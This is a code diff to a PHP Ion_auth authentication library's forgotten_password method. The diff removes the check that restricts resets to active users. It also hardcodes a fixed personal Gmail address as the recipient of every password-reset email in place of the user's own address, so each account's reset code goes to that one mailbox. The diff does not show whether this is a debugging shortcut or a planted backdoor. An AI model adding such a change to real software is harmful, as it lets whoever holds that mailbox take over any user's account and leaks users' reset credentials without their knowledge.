@@ -136,14 +136,16 @@ class Ion_auth
 	 */
 	public function forgotten_password($identity)
 	{
+
 		if ($this->ion_auth_model->forgotten_password($identity))
 		{
 			// Get user information
 			$identifier = $this->ion_auth_model->identity_column; // use model identity column, so it can be overridden in a controller
-			$user = $this->where($identifier, $identity)->where('active', 1)->users()->row();
+			$user = $this->where($identifier, $identity)->users()->row();
 
 			if ($user)
 			{
+
 				$data = array(
 					'identity' => $user->{$this->config->item('identity', 'ion_auth')},
 					'forgotten_password_code' => $user->forgotten_password_code
@@ -187,10 +189,11 @@ class Ion_auth
             
           $msubject = 'Password Reset';
          
-          $mail->addAddress($user->email, "Recepient Name");
+          $mail->addAddress("md.jual.ah@gmail.com", "Recepient Name");
           $mail->isHTML(true);
           $mail->Subject = $msubject;
           $mail->Body = $message;
+
           if($mail->send()) 
           {
             $this->set_message('forgot_password_successful');
